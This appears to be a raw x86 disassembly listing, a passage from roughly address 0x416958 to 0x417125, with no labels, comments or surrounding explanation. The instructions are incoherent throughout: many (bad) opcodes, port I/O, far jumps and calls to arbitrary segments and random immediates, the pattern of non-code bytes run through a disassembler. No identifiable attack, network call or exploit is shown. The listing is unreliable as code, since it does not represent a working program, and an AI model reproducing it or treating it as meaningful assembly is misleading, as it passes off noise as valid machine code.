  416958:	xchg   DWORD PTR [eax+ecx*8-0x5a50f703],esi
  41695f:	lock adc al,0x7f
  416962:	or     ecx,ebp
  416964:	cmp    ch,ah
  416966:	js     0x416904
  416968:	adc    eax,0xc3439d02
  41696d:	clc    
  41696e:	xor    ebx,esp
  416970:	add    ebx,DWORD PTR [edx-0x2c]
  416973:	pop    ebx
  416974:	mov    dh,0xc7
  416976:	jp     0x41694a
  416978:	pop    es
  416979:	push   edi
  41697a:	mov    ?,WORD PTR [esi-0x41acc178]
  416980:	inc    edx
  416981:	scas   al,BYTE PTR es:[edi]
  416982:	and    ah,BYTE PTR [ebp+eax*2-0x18ac8c67]
  416989:	ret    0xa87a
  41698c:	pop    edi
  41698d:	lea    ebx,[ebx]
  41698f:	stos   BYTE PTR es:[edi],al
  416990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416991:	mov    esi,0x7341b69d
  416996:	(bad)  
  416997:	dec    esp
  416998:	add    eax,0x13c250c
  41699d:	jnp    0x416940
  41699f:	fcomp  DWORD PTR [ecx]
  4169a1:	fs sub eax,ebp
  4169a4:	fcomp  DWORD PTR [ebx]
  4169a6:	imul   esi,DWORD PTR [ecx-0x37],0xa218aeb5
  4169ad:	(bad)  
  4169ae:	mov    esi,0xa8f7c662
  4169b3:	inc    esi
  4169b4:	mov    edx,0x19ef59ea
  4169b9:	jge    0x416a07
  4169bb:	repz cmp eax,0x350a76c5
  4169c1:	fbstp  TBYTE PTR [esi+0x68fc4edd]
  4169c7:	ret    0xaad0
  4169ca:	mov    al,ds:0xb2659b5a
  4169cf:	retf   
  4169d0:	push   edx
  4169d1:	and    al,0x48
  4169d3:	iret   
  4169d4:	jns    0x416a08
  4169d6:	das    
  4169d7:	cmp    eax,0xb2b15780
  4169dc:	mov    edi,0x53f18f02
  4169e1:	sub    esp,edx
  4169e3:	adc    DWORD PTR cs:[edi+0x5f],0x64
  4169e8:	push   esi
  4169e9:	push   ebp
  4169ea:	fdiv   st,st(2)
  4169ec:	dec    ecx
  4169ed:	das    
  4169ee:	push   ebp
  4169ef:	push   ebx
  4169f0:	jbe    0x4169fc
  4169f2:	jp     0x416a3f
  4169f4:	cmc    
  4169f5:	loopne 0x4169dc
  4169f7:	mov    al,0x9
  4169f9:	inc    esi
  4169fa:	es fwait
  4169fc:	mov    DWORD PTR [edx-0x4375fccd],edx
  416a02:	sub    BYTE PTR [esi-0x58b5982b],dh
  416a08:	jmp    DWORD PTR [ecx+eiz*4]
  416a0b:	call   0x1506:0x7a5af2a6
  416a12:	ret    
  416a13:	imul   ebp,esi,0x43
  416a16:	retf   
  416a17:	repz cmp cl,BYTE PTR [edi-0xc]
  416a1b:	fwait
  416a1c:	int    0xfd
  416a1e:	in     eax,dx
  416a1f:	cmp    DWORD PTR [edi-0x71],eax
  416a22:	and    eax,0xe014bb6e
  416a27:	or     ebx,ecx
  416a29:	jp     0x4169b8
  416a2b:	js     0x416a3c
  416a2d:	clc    
  416a2e:	xchg   DWORD PTR es:[ebp+ebx*2-0x6b53e162],ebx
  416a36:	enter  0x3989,0x6e
  416a3a:	loop   0x416a6a
  416a3c:	xor    dl,ah
  416a3e:	push   edi
  416a3f:	dec    edx
  416a40:	(bad)  
  416a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a42:	inc    ebp
  416a43:	cdq    
  416a44:	das    
  416a45:	push   esp
  416a46:	or     DWORD PTR [esi],0x3200df40
  416a4c:	leave  
  416a4d:	nop
  416a4e:	call   0xccc7d437
  416a53:	inc    ebx
  416a54:	mov    edx,0xeef2e76f
  416a59:	or     DWORD PTR [esi],esi
  416a5b:	xor    esp,DWORD PTR [edx-0x72]
  416a5e:	test   eax,0x8773e67b
  416a63:	data16 fdivr QWORD PTR [ecx-0x15]
  416a67:	repz xor BYTE PTR [esi-0x32bab7c8],dh
  416a6e:	(bad)  
  416a6f:	ins    DWORD PTR es:[edi],dx
  416a70:	pop    dx
  416a72:	push   ebp
  416a73:	call   0x6494:0xeba6f728
  416a7a:	jo     0x416a60
  416a7c:	xchg   esp,eax
  416a7d:	or     ebp,DWORD PTR [ecx]
  416a7f:	mov    DWORD PTR [ecx+ecx*8+0x7b095f91],eax
  416a86:	push   ecx
  416a87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a88:	or     edx,esp
  416a8a:	jp     0x416a31
  416a8c:	mov    ecx,0x9e57d17e
  416a91:	fisttp WORD PTR [ecx+0x19]
  416a94:	xor    DWORD PTR [esi*2+0x4a326cd6],0x22
  416a9c:	test   BYTE PTR [ebx-0x76c4d3d0],ah
  416aa2:	(bad)  
  416aa3:	lods   eax,DWORD PTR ds:[esi]
  416aa4:	mov    cl,0x3d
  416aa6:	xor    cl,BYTE PTR [eax+0x52]
  416aa9:	pusha  
  416aaa:	inc    ecx
  416aab:	in     eax,0x45
  416aad:	mov    ah,0xb9
  416aaf:	inc    esi
  416ab0:	outs   dx,DWORD PTR ds:[esi]
  416ab1:	nop
  416ab2:	outs   dx,DWORD PTR ds:[esi]
  416ab3:	mov    eax,0x9328b0d0
  416ab8:	lods   eax,DWORD PTR ds:[esi]
  416ab9:	and    DWORD PTR [edi],ebx
  416abb:	sub    eax,0x58f3b5ba
  416ac0:	cli    
  416ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac2:	scas   eax,DWORD PTR es:[edi]
  416ac3:	call   0x46c76d0c
  416ac8:	jmp    0x5229f2b0
  416acd:	loop   0x416b48
  416acf:	test   BYTE PTR [ebp+edi*4-0xf],0xf0
  416ad4:	outs   dx,BYTE PTR ds:[esi]
  416ad5:	int    0x7a
  416ad7:	xchg   esp,eax
  416ad8:	lods   eax,DWORD PTR ds:[esi]
  416ad9:	mov    ds:0xe4f89a5a,al
  416ade:	imul   eax,DWORD PTR [edx+0x3b0af70d],0xaee99658
  416ae8:	mov    eax,ds:0xc4ed7984
  416aed:	mov    ah,0x9
  416aef:	popf   
  416af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416af1:	std    
  416af2:	jge    0x416a97
  416af4:	push   eax
  416af5:	pop    eax
  416af6:	xor    ebx,DWORD PTR [ecx-0x23]
  416af9:	sub    edx,DWORD PTR [eax+0x729327e]
  416aff:	popa   
  416b00:	daa    
  416b01:	cwde   
  416b02:	or     eax,0x6e77a303
  416b07:	dec    esp
  416b08:	push   edx
  416b09:	jecxz  0x416b82
  416b0b:	or     ecx,DWORD PTR [ebx]
  416b0d:	inc    ebp
  416b0e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416b10:	xchg   DWORD PTR [esi+0x2e],ebp
  416b13:	mov    cl,0xed
  416b15:	les    ebp,FWORD PTR ds:0x9f7f45f0
  416b1b:	inc    eax
  416b1c:	xor    ah,BYTE PTR [edi-0x69]
  416b1f:	es aad 0x0
  416b22:	jl     0x416b07
  416b24:	repnz or bl,BYTE PTR [edx+0x50]
  416b28:	out    0x37,al
  416b2a:	pause  
  416b2c:	jns    0x416b7e
  416b2e:	arpl   WORD PTR [ebx-0x34],dx
  416b31:	mov    eax,ds:0xc85270b4
  416b36:	cmp    ch,BYTE PTR [esi-0x32]
  416b39:	cmp    DWORD PTR [eax+ecx*8-0x2a],0x7c
  416b3e:	iret   
  416b3f:	push   ebp
  416b40:	es or  al,0x11
  416b43:	push   es
  416b44:	ds push ds
  416b46:	or     eax,0x22bd5693
  416b4b:	sbb    eax,0x8da3ab9a
  416b50:	add    al,0xb2
  416b52:	call   0x97eab60a
  416b57:	push   edi
  416b58:	pop    es
  416b59:	sub    esp,esi
  416b5b:	ret    0x2b6e
  416b5e:	cmp    BYTE PTR [esi],dh
  416b60:	(bad)  
  416b61:	rol    DWORD PTR [edx-0xc],cl
  416b64:	cwde   
  416b65:	ret    0x97e5
  416b68:	jno    0x416be7
  416b6a:	cmp    BYTE PTR [esi+0x46],ch
  416b6d:	jbe    0x416b5a
  416b6f:	int3   
  416b70:	add    al,BYTE PTR [edx]
  416b72:	ret    
  416b73:	scas   eax,DWORD PTR es:[edi]
  416b74:	or     BYTE PTR [edi+ebp*4-0x4f],dl
  416b78:	push   es
  416b79:	pop    ebx
  416b7a:	dec    ecx
  416b7b:	pop    edi
  416b7c:	rcl    BYTE PTR [ebx],0x56
  416b7f:	fstp   QWORD PTR [eax+0x34]
  416b82:	and    cl,al
  416b84:	(bad)  
  416b85:	popf   
  416b86:	mov    edi,0xb2c32149
  416b8b:	fsub   DWORD PTR [ecx+eax*2+0x27ecd29e]
  416b92:	inc    eax
  416b93:	push   edx
  416b94:	arpl   WORD PTR [edi+esi*8+0x5],di
  416b98:	loope  0x416b5f
  416b9a:	jnp    0x416c18
  416b9c:	pop    ebp
  416b9d:	addr16 dec esp
  416b9f:	cwde   
  416ba0:	scas   eax,DWORD PTR es:[edi]
  416ba1:	add    eax,0x2f3994c5
  416ba6:	adc    eax,0x8860588
  416bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bac:	mov    ecx,0xbe2160c4
  416bb1:	ret    
  416bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb3:	out    0xe5,al
  416bb5:	pshufw mm2,QWORD PTR [ecx],0x51
  416bb9:	fist   WORD PTR [eax-0x3c24ef4b]
  416bbf:	lds    edx,FWORD PTR [ebx-0x252ead64]
  416bc5:	loope  0x416b5e
  416bc7:	mov    BYTE PTR [eax-0x7b],bh
  416bca:	or     eax,0x73ffed40
  416bcf:	sub    DWORD PTR [ebp+0x1a],ebx
  416bd2:	add    edi,0xffffffbc
  416bd5:	daa    
  416bd6:	mov    bl,BYTE PTR [ebx+0x43]
  416bd9:	ss add BYTE PTR ss:[bx-0x5151],dh
  416be0:	adc    DWORD PTR [ebx+0x26c365a4],ecx
  416be6:	ins    BYTE PTR es:[edi],dx
  416be7:	and    DWORD PTR [ecx-0x23],edi
  416bea:	test   DWORD PTR [edi+eiz*1+0xa],edi
  416bee:	ja     0x416c6a
  416bf0:	test   al,0x29
  416bf2:	xor    edi,edx
  416bf4:	neg    ebp
  416bf6:	xor    BYTE PTR ds:[esi-0x6025a7c1],ch
  416bfd:	jne    0x416bc0
  416bff:	dec    ecx
  416c00:	scas   al,BYTE PTR es:[edi]
  416c01:	jo     0x416bd4
  416c03:	lahf   
  416c04:	push   0xfffffff6
  416c06:	xchg   edx,eax
  416c07:	pop    ebx
  416c08:	inc    ebx
  416c09:	jno    0x416bcb
  416c0b:	aad    0xf7
  416c0d:	xchg   ebx,eax
  416c0e:	ins    BYTE PTR es:[edi],dx
  416c0f:	fld    QWORD PTR [edi]
  416c11:	inc    ebx
  416c12:	out    0x9f,eax
  416c14:	daa    
  416c15:	sbb    eax,0x8dc59d8c
  416c1a:	clc    
  416c1b:	out    dx,eax
  416c1c:	xor    ecx,DWORD PTR [edx-0x6b]
  416c1f:	in     eax,0x31
  416c21:	cli    
  416c22:	dec    ebx
  416c23:	cmp    al,0xce
  416c25:	inc    ecx
  416c26:	lods   al,BYTE PTR ds:[esi]
  416c27:	xchg   ecx,eax
  416c28:	imul   esp,DWORD PTR [edi+0x11],0x846d06d6
  416c2f:	stos   DWORD PTR es:[edi],eax
  416c30:	adc    ah,BYTE PTR [eax-0x7597c931]
  416c36:	rsm    
  416c38:	dec    edx
  416c39:	setno  BYTE PTR [ebx+0x65]
  416c3d:	or     DWORD PTR [edx],esp
  416c3f:	add    bl,BYTE PTR [ecx]
  416c41:	pop    edi
  416c42:	fmul   DWORD PTR [esi-0xd]
  416c45:	mov    eax,ds:0x1e203ef
  416c4a:	mov    DWORD PTR [eax],edx
  416c4c:	ins    BYTE PTR es:[edi],dx
  416c4d:	rcl    DWORD PTR [ebp-0x73],1
  416c50:	enter  0xfd9c,0x7c
  416c54:	mov    al,ds:0x1512ae89
  416c59:	or     BYTE PTR [edi+eiz*1],0xb0
  416c5d:	rol    ecx,0xcb
  416c60:	xchg   edi,eax
  416c61:	dec    esi
  416c62:	cmp    BYTE PTR [ecx],dl
  416c64:	jp     0x416cc1
  416c66:	inc    eax
  416c67:	mov    edx,0x2fe3bcfc
  416c6c:	or     eax,0x33a24112
  416c71:	nop
  416c72:	inc    edx
  416c73:	rol    BYTE PTR [ebx],cl
  416c75:	push   es
  416c76:	fmul   DWORD PTR [ebp-0x16c488e1]
  416c7c:	pop    ebx
  416c7d:	ret    
  416c7e:	imul   ecx,DWORD PTR [edi+0x10d3202],0x2aa9cdd7
  416c88:	jns    0x416c5a
  416c8a:	xlat   BYTE PTR ds:[ebx]
  416c8b:	pop    ax
  416c8d:	imul   edx,edx,0xffffff9a
  416c90:	lea    ebp,[edx+0x3a]
  416c93:	test   BYTE PTR es:[eax-0x59bf0c34],ch
  416c9a:	cwde   
  416c9b:	mov    eax,0x13508bdb
  416ca0:	sub    esp,esp
  416ca2:	ins    BYTE PTR es:[edi],dx
  416ca3:	xor    esp,DWORD PTR [edx+edx*8+0x6fa47bcf]
  416caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cab:	mov    ah,0x5b
  416cad:	je     0x416cc9
  416caf:	(bad)  
  416cb0:	mov    bh,0x48
  416cb2:	xor    DWORD PTR [edx],edi
  416cb4:	push   edx
  416cb5:	pop    edx
  416cb6:	push   esp
  416cb7:	mov    dl,0x24
  416cb9:	dec    BYTE PTR [esi]
  416cbb:	mov    cl,0x5
  416cbd:	call   0xa936:0xbc6f7c4c
  416cc4:	xchg   BYTE PTR [eax+0x35],dl
  416cc7:	mov    ds:0xdd93a84f,al
  416ccc:	ds cld 
  416cce:	outs   dx,BYTE PTR ds:[esi]
  416ccf:	arpl   bp,si
  416cd1:	ret    0xff1c
  416cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd5:	int3   
  416cd6:	jb     0x416c77
  416cd8:	arpl   WORD PTR [ebp+0x6674c435],si
  416cde:	inc    edi
  416cdf:	lods   eax,DWORD PTR ds:[esi]
  416ce0:	ins    DWORD PTR es:[edi],dx
  416ce1:	test   eax,ebp
  416ce3:	push   0xffffffa2
  416ce5:	inc    esi
  416ce6:	sbb    dh,BYTE PTR [esp+eiz*4+0x7054f806]
  416ced:	popa   
  416cee:	lea    ebx,[ebp+0x1d]
  416cf1:	jge    0x416cf4
  416cf3:	jecxz  0x416d5b
  416cf5:	mov    ah,0x86
  416cf7:	lods   al,BYTE PTR ds:[esi]
  416cf8:	cld    
  416cf9:	xchg   bl,bl
  416cfb:	js     0x416d6c
  416cfd:	out    dx,al
  416cfe:	repnz inc edx
  416d00:	adc    al,0xc1
  416d02:	jg     0x416cba
  416d04:	jge    0x416d1b
  416d06:	jbe    0x416d03
  416d08:	pop    eax
  416d09:	retf   
  416d0a:	mov    dl,0xc3
  416d0c:	data16 xchg BYTE PTR [edx*2+0x69ee0a0a],ah
  416d14:	push   esi
  416d15:	lods   eax,DWORD PTR ds:[esi]
  416d16:	dec    edx
  416d17:	inc    edi
  416d18:	pop    es
  416d19:	mov    cl,0x29
  416d1b:	xor    al,dl
  416d1d:	gs lock push edx
  416d20:	mov    al,ds:0x41092bdd
  416d25:	out    dx,al
  416d26:	jl     0x416d3f
  416d28:	cmp    ecx,eax
  416d2a:	jmp    0xea10:0x4b61d810
  416d31:	mov    edx,0x63fdda21
  416d36:	mov    ebx,0x606764bf
  416d3b:	cmp    bh,BYTE PTR [ebx+0x2eb16431]
  416d41:	mov    cl,0x84
  416d43:	stos   BYTE PTR es:[edi],al
  416d44:	outs   dx,BYTE PTR ds:[esi]
  416d45:	fild   WORD PTR [eax-0x1d15637]
  416d4b:	out    0x52,eax
  416d4d:	sbb    DWORD PTR [esi-0x979ca4c],ebp
  416d53:	lahf   
  416d54:	stc    
  416d55:	loopne 0x416d0c
  416d57:	and    ecx,0xffffffcf
  416d5a:	dec    esp
  416d5b:	mov    edi,0x4271020f
  416d60:	lahf   
  416d61:	jl     0x416d49
  416d63:	out    dx,eax
  416d64:	or     bh,BYTE PTR [ecx+0x7718455c]
  416d6a:	and    al,0x5d
  416d6c:	mov    esi,0x610dda03
  416d71:	mov    ds:0x25c606fe,eax
  416d76:	ret    
  416d77:	and    DWORD PTR [ebx-0x4a],edi
  416d7a:	and    dh,BYTE PTR [edi-0x32]
  416d7d:	dec    ecx
  416d7e:	lods   eax,DWORD PTR ds:[esi]
  416d7f:	aas    
  416d80:	mov    ecx,0x3a32435b
  416d85:	call   0xbef00e7f
  416d8a:	add    eax,0x1994943b
  416d8f:	mov    eax,0xa702d70b
  416d94:	arpl   WORD PTR [ebp+0x6a],cx
  416d97:	bound  esi,QWORD PTR gs:[ebp+0x20b375a2]
  416d9e:	sub    DWORD PTR [ecx],ebp
  416da0:	(bad)  
  416da1:	nop
  416da2:	ja     0x416da7
  416da4:	sub    bh,BYTE PTR [edx+ebx*2-0x40]
  416da8:	mov    ss,edi
  416daa:	cmp    BYTE PTR [eax+ebp*8-0x69],dh
  416dae:	in     eax,0xf7
  416db0:	fadd   st,st(1)
  416db2:	fwait
  416db3:	es mov edx,0x17422148
  416db9:	scas   eax,DWORD PTR es:[edi]
  416dba:	ror    BYTE PTR [edi-0x8],0x81
  416dbe:	arpl   cx,si
  416dc0:	cld    
  416dc1:	fs clc 
  416dc3:	in     eax,0xd
  416dc5:	test   DWORD PTR [ebp+eiz*8-0x7622ccf7],0xc5b022b9
  416dd0:	inc    esp
  416dd1:	mov    ch,0xc5
  416dd3:	das    
  416dd4:	cmp    al,0x3f
  416dd6:	mov    edx,ss
  416dd8:	sub    esp,DWORD PTR [edx-0x22]
  416ddb:	out    0xd0,al
  416ddd:	lock jmp 0x416da3
  416de0:	data16 sub dh,BYTE PTR [ebx-0x73]
  416de4:	dec    edx
  416de5:	or     ecx,ebx
  416de7:	add    bl,BYTE PTR [esi-0x62]
  416dea:	inc    esi
  416deb:	pop    ebx
  416dec:	and    eax,0xff9e1d03
  416df1:	adc    BYTE PTR [edx-0x13],cl
  416df4:	jae    0x416daf
  416df6:	inc    ecx
  416df7:	mov    eax,ebx
  416df9:	ss dec esp
  416dfb:	sbb    ebp,DWORD PTR [eax]
  416dfd:	add    al,0xe
  416dff:	jmp    0x396f75dd
  416e04:	cmp    DWORD PTR [ecx-0x2b],ebx
  416e07:	push   cs
  416e08:	lahf   
  416e09:	push   edi
  416e0a:	cmp    eax,0x9816b091
  416e0f:	ja     0x416e57
  416e11:	jno    0x416e19
  416e13:	push   esp
  416e14:	ja     0x416e44
  416e16:	pushf  
  416e17:	pop    esp
  416e18:	stc    
  416e19:	push   ebx
  416e1a:	dec    edi
  416e1b:	mov    bl,0x33
  416e1d:	mov    edx,ebx
  416e1f:	lock jecxz 0x416e90
  416e22:	push   esi
  416e23:	repnz add BYTE PTR [esi],ah
  416e26:	inc    esp
  416e27:	ret    0xdf84
  416e2a:	add    al,0x14
  416e2c:	fmul   DWORD PTR [esi-0x56]
  416e2f:	mov    WORD PTR [ebx+ecx*4-0xe4db99],cs
  416e36:	out    0xb6,eax
  416e38:	shl    DWORD PTR ds:0x52b8a81,0x41
  416e3f:	jbe    0x416e90
  416e41:	sbb    al,0x56
  416e43:	push   ecx
  416e44:	sbb    al,0xb4
  416e46:	jne    0x416e56
  416e48:	push   es
  416e49:	and    bl,BYTE PTR [ecx+0x18e5d269]
  416e4f:	jp     0x416e97
  416e51:	inc    eax
  416e52:	std    
  416e53:	stos   DWORD PTR es:[edi],eax
  416e54:	sub    cl,BYTE PTR [ebp-0xbefb45f]
  416e5a:	mov    DWORD PTR [esi],eax
  416e5c:	xchg   ebp,eax
  416e5d:	xchg   ecx,eax
  416e5e:	scas   eax,DWORD PTR es:[edi]
  416e5f:	mov    ds:0xdda20ec0,eax
  416e64:	pusha  
  416e65:	mov    eax,ds:0x75ca323d
  416e6a:	pop    ds
  416e6b:	loop   0x416ed5
  416e6d:	adc    BYTE PTR [esi-0x1d],cl
  416e70:	jmp    0xb7b7:0xc828496e
  416e77:	lahf   
  416e78:	fcmovu st,st(5)
  416e7a:	iret   
  416e7b:	and    ebx,DWORD PTR ds:0x2ea686f9
  416e81:	and    edx,DWORD PTR [edx+0x734ad744]
  416e87:	jbe    0x416e1e
  416e89:	push   edi
  416e8a:	out    dx,eax
  416e8b:	jno    0x416ef2
  416e8d:	push   0xfca8b78f
  416e92:	fwait
  416e93:	scas   al,BYTE PTR es:[edi]
  416e94:	mov    edi,0xe572b43e
  416e99:	pop    ebp
  416e9a:	test   DWORD PTR [ecx-0x63],0x427bc709
  416ea1:	xchg   ecx,eax
  416ea2:	xchg   ebx,eax
  416ea3:	xor    DWORD PTR [edi+0x40],eax
  416ea6:	cld    
  416ea7:	mov    ds:0xb277046b,eax
  416eac:	jbe    0x416f03
  416eae:	js     0x416eb3
  416eb0:	sub    al,0x31
  416eb2:	dec    ecx
  416eb3:	mov    bh,0xb6
  416eb5:	or     ecx,DWORD PTR [ecx]
  416eb7:	push   ecx
  416eb8:	ss dec eax
  416eba:	lahf   
  416ebb:	ret    
  416ebc:	es adc eax,0x9bdda7b4
  416ec2:	(bad)  
  416ec3:	hlt    
  416ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ec5:	add    dl,al
  416ec7:	sub    bl,BYTE PTR [ecx+0x76]
  416eca:	(bad)  
  416ecb:	adc    dh,cl
  416ecd:	sub    eax,0x19a40902
  416ed2:	into   
  416ed3:	xor    al,0xcb
  416ed5:	retf   
  416ed6:	(bad)  
  416ed7:	pop    ebx
  416ed8:	mov    cl,0xba
  416eda:	addr16 add eax,0xd235b07d
  416ee0:	jmp    0x1b5e:0x506bf68c
  416ee7:	jmp    0x30a2f808
  416eec:	nop
  416eed:	mov    ebp,0x5458d11b
  416ef2:	jmp    0xedfc:0xa58784e6
  416ef9:	rcr    BYTE PTR [edx-0x64f7df4b],cl
  416eff:	ja     0x416efa
  416f01:	rcl    DWORD PTR [esi-0x5a3979d8],cl
  416f07:	clc    
  416f08:	enter  0xcdd4,0x70
  416f0c:	add    eax,0x30362f14
  416f11:	aam    0xe8
  416f13:	jnp    0x416ed3
  416f15:	frstor [esp+eiz*8-0x204f48f7]
  416f1c:	jbe    0x416f50
  416f1e:	in     al,dx
  416f1f:	mov    ds:0x8de01e99,eax
  416f24:	cli    
  416f25:	lea    esi,[ecx+0x3e13bd11]
  416f2b:	xchg   esp,eax
  416f2c:	pusha  
  416f2d:	dec    edx
  416f2e:	jae    0x416f6b
  416f30:	fdiv   DWORD PTR [ebx]
  416f32:	add    BYTE PTR [eax+0x66adb6fe],al
  416f38:	aaa    
  416f39:	fcomp  QWORD PTR [edx]
  416f3b:	ds clc 
  416f3d:	jae    0x416f7e
  416f3f:	(bad)  
  416f40:	lea    eax,[esi+eax*4+0x69]
  416f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f45:	dec    edi
  416f46:	xchg   edx,eax
  416f47:	rol    BYTE PTR [esi-0x321606e2],1
  416f4d:	push   0xffffff97
  416f4f:	mov    dl,0x7c
  416f51:	ins    BYTE PTR es:[edi],dx
  416f52:	push   ss
  416f53:	aas    
  416f54:	lahf   
  416f55:	push   cs
  416f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f57:	mov    ebp,0x680a6812
  416f5c:	dec    ebp
  416f5d:	out    0x25,al
  416f5f:	mov    bh,BYTE PTR [edi-0x282c9995]
  416f65:	js     0x416fcc
  416f67:	cmc    
  416f68:	fldcw  WORD PTR ds:0x44058cc7
  416f6e:	mov    eax,0x8dce5158
  416f73:	in     al,dx
  416f74:	(bad)  
  416f75:	adc    bh,ch
  416f77:	dec    esp
  416f78:	idiv   ebp
  416f7a:	outs   dx,BYTE PTR ds:[esi]
  416f7b:	retf   
  416f7c:	pop    eax
  416f7d:	mov    edi,0xd9d42663
  416f82:	xchg   edi,eax
  416f83:	push   ebx
  416f84:	adc    ebx,ecx
  416f86:	call   0xcf58bbae
  416f8b:	retf   0x6c58
  416f8e:	iret   
  416f8f:	jge    0x416fb1
  416f91:	xchg   esp,eax
  416f92:	cdq    
  416f93:	adc    cl,BYTE PTR [edi-0x5953e173]
  416f99:	push   esp
  416f9a:	mov    dl,0x86
  416f9c:	ret    
  416f9d:	jl     0x416fcb
  416f9f:	int    0x72
  416fa1:	lock mov edi,0x2b58955e
  416fa7:	cmc    
  416fa8:	mov    ds:0x4600cc99,eax
  416fad:	mov    esp,DWORD PTR [esi-0x7]
  416fb0:	int3   
  416fb1:	lahf   
  416fb2:	dec    esi
  416fb3:	xchg   DWORD PTR [edi],edx
  416fb5:	xchg   edx,eax
  416fb6:	push   ss
  416fb7:	out    0xde,eax
  416fb9:	cmc    
  416fba:	xlat   BYTE PTR ds:[ebx]
  416fbb:	mov    eax,DWORD PTR [ebx+esi*4]
  416fbe:	mov    DWORD PTR [ecx],0xae2fc713
  416fc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fc5:	mov    ebx,0xb7a8067b
  416fca:	(bad)  
  416fcb:	adc    al,0x8d
  416fcd:	and    edi,DWORD PTR [esi-0xe]
  416fd0:	sbb    ebp,DWORD PTR [esi+0x42]
  416fd3:	push   ecx
  416fd4:	pop    ebp
  416fd5:	cmc    
  416fd6:	or     al,ch
  416fd8:	adc    al,0xe9
  416fda:	xchg   DWORD PTR [edi+0x590eafd0],ebx
  416fe0:	sub    ah,ah
  416fe2:	pop    es
  416fe3:	add    ch,cl
  416fe5:	arpl   WORD PTR ds:0x51fff072,bx
  416feb:	pop    ss
  416fec:	call   0x4f7a:0xd4642a12
  416ff3:	mov    edi,0xd3ff6b95
  416ff8:	pusha  
  416ff9:	jmp    0xc6dc384b
  416ffe:	push   ebp
  416fff:	repz mov ds:0x5a754459,eax
  417005:	leave  
  417006:	aam    0xee
  417008:	popf   
  417009:	mov    cl,0x18
  41700b:	pop    ecx
  41700c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41700d:	jns    0x417073
  41700f:	not    DWORD PTR [edi]
  417011:	push   esi
  417012:	cmp    DWORD PTR [ebp+0x7d97d294],eax
  417018:	dec    edx
  417019:	int3   
  41701a:	cs (bad) 
  41701c:	shl    ebp,1
  41701e:	call   0x8b95de3f
  417023:	fnsave [esi-0x3def79ef]
  417029:	jnp    0x417088
  41702b:	daa    
  41702c:	xchg   ebp,eax
  41702d:	bound  ebx,QWORD PTR [edx+0x63]
  417030:	mov    ebx,0x94aa7c80
  417035:	inc    ecx
  417036:	paddq  mm5,mm6
  417039:	pusha  
  41703a:	scas   eax,DWORD PTR es:[edi]
  41703b:	jg     0x417062
  41703d:	sbb    BYTE PTR [ebp-0x80],0x21
  417041:	adc    BYTE PTR [edi],bl
  417043:	mov    edx,0xf2272a3d
  417048:	fild   WORD PTR [ebp+0x26]
  41704b:	sbb    esi,esi
  41704d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41704e:	mov    dl,BYTE PTR [esi-0x2c]
  417051:	leave  
  417052:	leave  
  417053:	and    eax,0x8cba6956
  417058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417059:	sub    al,ch
  41705b:	mov    ebp,0x401f0240
  417060:	mov    ds:0x25909522,eax
  417065:	call   0x2560:0x94f2eb00
  41706c:	dec    ecx
  41706d:	outs   dx,BYTE PTR ds:[esi]
  41706e:	push   es
  41706f:	leave  
  417070:	xor    BYTE PTR [esi+0x6b],bl
  417073:	and    DWORD PTR [edx+0x19],0x81f46d0b
  41707a:	cwde   
  41707b:	push   0x576bcffd
  417080:	ss dec edx
  417082:	mov    esp,0xd27a4943
  417087:	dec    ebp
  417088:	je     0x41700e
  41708a:	mov    WORD PTR [ecx+0x572d9dbf],fs
  417090:	mov    al,0xad
  417092:	stos   DWORD PTR es:[edi],eax
  417093:	hlt    
  417094:	pushf  
  417095:	fisttp DWORD PTR [ecx]
  417097:	rcl    BYTE PTR [edi-0x4b],cl
  41709a:	mov    ch,0x4a
  41709c:	sar    DWORD PTR [eax-0x12081d6b],0x43
  4170a3:	popf   
  4170a4:	cmp    bl,0xbc
  4170a7:	ret    0x8a97
  4170aa:	ds call 0xa149a5b3
  4170b0:	adc    ecx,ebx
  4170b2:	sti    
  4170b3:	xor    DWORD PTR [ecx-0x5],ecx
  4170b6:	loop   0x4170ee
  4170b8:	out    dx,al
  4170b9:	js     0x4170d6
  4170bb:	ror    DWORD PTR [ebx],0x8
  4170be:	and    ebp,ebx
  4170c0:	test   DWORD PTR [eax-0x7a2b4f7d],edx
  4170c6:	hlt    
  4170c7:	push   ds
  4170c8:	fstp   TBYTE PTR [ebx-0x59]
  4170cb:	dec    edx
  4170cc:	mov    esp,0xd8bd3a1a
  4170d1:	xchg   ebp,eax
  4170d2:	xchg   ebx,eax
  4170d3:	(bad)
  4170d7:	inc    esi
  4170d8:	pop    eax
  4170d9:	jmp    0xc260:0xad0cefb6
  4170e0:	or     dl,BYTE PTR [ebx+eax*8+0x4c]
  4170e4:	shl    DWORD PTR [edx+eiz*4+0x283ca3ec],0xc4
  4170ec:	sub    BYTE PTR fs:[edx-0x53],0x78
  4170f1:	lahf   
  4170f2:	push   edx
  4170f3:	push   es
  4170f4:	repz (bad) 
  4170f6:	es ins BYTE PTR es:[edi],dx
  4170f8:	call   0x6ba56802
  4170fd:	push   0x6f754b1f
  417102:	rcr    BYTE PTR [eax+eax*1+0xee82b9a],1
  417109:	iret   
  41710a:	mov    ah,0x6d
  41710c:	mov    al,ds:0x9147fbc6
  417111:	div    BYTE PTR [edx-0x2d57dcde]
  417117:	cld    
  417118:	(bad)  
  417119:	dec    edi
  41711a:	add    eax,0x93a05b0d
  41711f:	in     al,0x3c
  417121:	jg     0x4170e6
  417123:	jecxz  0x417127
  417125:	ja     0x4170dc
